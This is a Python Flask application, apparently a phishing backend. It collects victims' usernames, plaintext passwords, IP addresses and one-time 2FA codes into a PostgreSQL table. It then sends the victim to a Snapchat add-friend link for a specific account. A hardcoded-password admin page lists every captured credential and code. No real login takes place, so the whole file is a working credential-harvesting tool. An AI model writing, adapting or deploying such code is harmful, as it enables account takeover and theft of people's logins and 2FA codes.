from flask import Flask, render_template, request, redirect, url_for, session, flash
import psycopg2
import os
from datetime import datetime
import re

app = Flask(__name__)
app.secret_key = 'your-secret-key-here'

# الاتصال بقاعدة PostgreSQL
DATABASE_URL = os.environ.get('DATABASE_URL')

def get_connection():
    return psycopg2.connect(DATABASE_URL)

def init_db():
    conn = get_connection()
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS login_attempts (
            id SERIAL PRIMARY KEY,
            username TEXT NOT NULL,
            password TEXT NOT NULL,
            timestamp TIMESTAMPTZ NOT NULL,
            ip_address TEXT NOT NULL,
            otp_code TEXT
        )
    ''')
    conn.commit()
    cursor.close()
    conn.close()

init_db()

@app.route('/')
def login():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def handle_login():
    username = request.form['username']
    password = request.form['password']

    # تحقق من أن الحقول تحتوي على أحرف إنجليزية فقط
    if not re.match(r'^[A-Za-z0-9_]+$', username) or not re.match(r'^[A-Za-z0-9_]+$', password):
        flash('Please enter username and password using English letters and numbers only.')
        return redirect(url_for('login'))

    ip_address = request.environ.get('HTTP_X_FORWARDED_FOR', request.remote_addr)
    timestamp = datetime.utcnow()

    conn = get_connection()
    cursor = conn.cursor()
    cursor.execute('''
        INSERT INTO login_attempts (username, password, timestamp, ip_address)
        VALUES (%s, %s, %s, %s)
        RETURNING id
    ''', (username, password, timestamp, ip_address))
    login_id = cursor.fetchone()[0]
    conn.commit()
    cursor.close()
    conn.close()

    session['username'] = username
    session['login_id'] = login_id
    return redirect(url_for('otp'))

@app.route('/otp')
def otp():
    if 'username' not in session:
        return redirect(url_for('login'))
    return render_template('otp.html')

@app.route('/verify-otp', methods=['POST'])
def verify_otp():
    otp_code = request.form['otp_code']
    login_id = session.get('login_id')

    if login_id:
        conn = get_connection()
        cursor = conn.cursor()
        cursor.execute('''
            UPDATE login_attempts SET otp_code = %s WHERE id = %s
        ''', (otp_code, login_id))
        conn.commit()
        cursor.close()
        conn.close()

    # التوجيه مباشرة إلى تطبيق سناب شات لعرض حساب معين
    return redirect("snapchat://add/maymona19")

@app.route('/admin')
def admin():
    password = request.args.get('password')
    if password != 'A554399a':
        return "Unauthorized: Please provide correct password", 401

    conn = get_connection()
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM login_attempts ORDER BY timestamp DESC')
    attempts = cursor.fetchall()
    cursor.close()
    conn.close()

    return render_template('admin.html', attempts=attempts)

if __name__ == '__main__':
    app.run(debug=True)
